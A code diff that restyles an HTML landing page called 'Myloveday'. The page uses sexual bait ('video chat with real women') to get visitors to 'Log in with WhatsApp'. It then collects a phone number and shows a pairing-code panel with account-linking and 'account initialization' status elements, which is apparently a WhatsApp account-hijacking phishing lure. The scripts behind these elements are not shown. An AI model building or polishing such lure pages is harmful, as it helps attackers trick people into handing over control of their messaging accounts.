@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title data-copy="title">Myloveday</title>
     <meta name="description" content="Log in with WhatsApp to video chat." data-copy="description" />
     <meta property="og:title" content="Myloveday" data-copy="title" />
@@ -12,71 +12,56 @@
     <link rel="stylesheet" href="assets/theme.css" />
   </head>
   <body>
-    <div class="page-shell">
-      <div class="main-image-section" aria-hidden="true">
+    <div class="scene-backdrop" aria-hidden="true">
+      <div class="main-image-section">
         <div class="scrolling-images">
           <div class="scrolling-image"></div>
           <div class="scrolling-image"></div>
         </div>
       </div>
+      <div class="thumbnails">
+        <div class="thumbnails-container">
+          <img src="assets/images/2.jpg" alt="" class="thumbnail" width="437" height="779" />
+          <img src="assets/images/3-1.jpg" alt="" class="thumbnail" width="440" height="779" loading="lazy" />
+          <img src="assets/images/4.jpg" alt="" class="thumbnail" width="439" height="777" loading="lazy" />
+          <img src="assets/images/5-1.jpg" alt="" class="thumbnail" width="439" height="779" loading="lazy" />
+          <img src="assets/images/6-1.jpg" alt="" class="thumbnail" width="460" height="690" loading="lazy" />
+          <img src="assets/images/7.jpg" alt="" class="thumbnail" width="438" height="780" loading="lazy" />
+          <img src="assets/images/8.jpg" alt="" class="thumbnail" width="437" height="780" loading="lazy" />
+          <img src="assets/images/2.jpg" alt="" class="thumbnail" width="437" height="779" loading="lazy" />
+          <img src="assets/images/3-1.jpg" alt="" class="thumbnail" width="440" height="779" loading="lazy" />
+          <img src="assets/images/4.jpg" alt="" class="thumbnail" width="439" height="777" loading="lazy" />
+        </div>
+      </div>
+    </div>
 
-      <div class="left-container">
+    <main class="theme-shell">
+      <header class="campaign-header">
         <h1 class="title-text" data-copy="brandTitle">Myloveday</h1>
         <div class="left-image-text-container">
           <div class="left-image">
-            <img src="assets/images/cs1.jpg" alt="" />
+            <img src="assets/images/cs1.jpg" alt="" width="437" height="779" loading="lazy" />
           </div>
           <p class="text-label" data-copy="heroText">
             Log in with WhatsApp to video chat with real women. (The women here are very direct.)
           </p>
         </div>
+      </header>
+
+      <div class="campaign-copy">
+        <h2 data-copy="overlayTitle">Log in to unlock Full Photo &amp; Video</h2>
+        <p data-copy="overlaySubtitle">Enjoy more exciting content!</p>
       </div>
 
-      <div class="thumbnails" aria-hidden="true">
-        <div class="thumbnails-container">
-          <img src="assets/images/2.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/3-1.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/4.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/5-1.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/6-1.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/7.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/8.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/2.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/3-1.jpg" alt="" class="thumbnail" />
-          <img src="assets/images/4.jpg" alt="" class="thumbnail" />
-        </div>
-      </div>
-
-      <a href="#account-link" class="download-button">
-        <span data-copy="ctaButton">Login with WhatsApp</span>
-      </a>
-    </div>
-
-    <div id="account-link" class="account-link-overlay">
-      <div class="account-link-panel">
-        <a href="#" class="overlay-close" aria-label="Close">&times;</a>
-        <div class="text-info">
-          <h2 data-copy="overlayTitle">Log in to unlock Full Photo &amp; Video</h2>
-          <p data-copy="overlaySubtitle">Enjoy more exciting content!</p>
-        </div>
-        <account-link-flow class="link-flow">
-          <account-link-locale-switcher></account-link-locale-switcher>
-          <div class="login-box">
-            <phone-number-field></phone-number-field>
-            <account-link-submit></account-link-submit>
-          </div>
-          <pairing-code-panel></pairing-code-panel>
-          <img
-            class="tip-guide"
-            src="assets/images/ic-code-tip.png"
-            alt=""
-            data-copy="tipAlt"
-          />
-          <app-launch-actions></app-launch-actions>
-          <account-link-status></account-link-status>
-          <account-initialization-status></account-initialization-status>
-        </account-link-flow>
-      </div>
-    </div>
+      <account-link-flow>
+        <account-link-locale-switcher></account-link-locale-switcher>
+        <phone-number-field></phone-number-field>
+        <account-link-submit></account-link-submit>
+        <pairing-code-panel></pairing-code-panel>
+        <app-launch-actions></app-launch-actions>
+        <account-link-status></account-link-status>
+        <account-initialization-status></account-initialization-status>
+      </account-link-flow>
+    </main>
   </body>
 </html>
